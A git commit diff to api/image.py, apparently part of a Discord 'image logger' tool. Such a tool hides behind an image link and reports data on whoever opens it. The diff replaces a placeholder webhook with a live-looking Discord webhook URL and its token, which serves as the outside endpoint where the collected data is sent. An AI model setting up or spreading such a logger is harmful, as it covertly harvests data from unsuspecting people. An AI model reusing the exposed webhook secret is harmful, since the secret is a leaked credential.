d7d47f6c5bc6625047e4ea494ab0108da81e88b7
TheCoolIllusions <skriptkanal1@gmail.com>
2025-01-30 21:44:33 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://canary.discord.com/api/webhooks/1334700661929148496/NHqFmGSS1S-Cys-4bylgpAyYKmaQTlwJ6n-991f8Ff0tfAGKb0Ku5pIOgxVBluIsJzzW",
     "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
